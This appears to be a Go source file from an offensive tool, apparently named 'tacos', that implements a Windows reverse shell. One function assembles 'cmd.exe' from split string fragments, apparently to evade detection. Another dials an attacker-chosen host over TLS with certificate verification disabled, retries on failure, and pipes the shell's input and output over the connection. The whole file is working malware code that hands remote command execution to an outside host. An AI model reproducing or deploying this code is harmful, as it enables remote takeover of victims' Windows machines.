//go:build windows
// +build windows

package tacos

import (
	"crypto/tls"
	"fmt"
	"net"
	"os/exec"
	"strings"
	"time"
)

// DetectDefaultShell returns the default shell (cmd.exe on Windows).
func DetectDefaultShell() string {
	shell := strings.ToLower(fmt.Sprintf("%s%s%s", "Cm", "D.e", "Xe"))
	return shell
}

// ShellReverse spawns a reverse shell targeting host (ip:port).
func ShellReverse(host string, shell string, timeoutSec int, maxRetries int) {
	conf := &tls.Config{
		InsecureSkipVerify: true,
	}

	dialer := &net.Dialer{
		Timeout: time.Duration(timeoutSec) * time.Second,
	}

	var conn *tls.Conn
	var err error
	for attempt := 0; attempt <= maxRetries; attempt++ {
		conn, err = tls.DialWithDialer(dialer, "tcp", host, conf)
		if err == nil {
			break
		}
		fmt.Printf("Connection attempt %d/%d failed: %s\n", attempt+1, maxRetries+1, err)
		if attempt < maxRetries {
			time.Sleep(2 * time.Second)
		}
	}
	if err != nil {
		fmt.Printf("Failed to connect to %s after %d attempt(s): %s\n", host, maxRetries+1, err)
		return
	}
	defer conn.Close()

	cmd := exec.Command(shell)
	cmd.Stdin = conn
	cmd.Stdout = conn
	cmd.Stderr = conn
	cmd.Run()
}
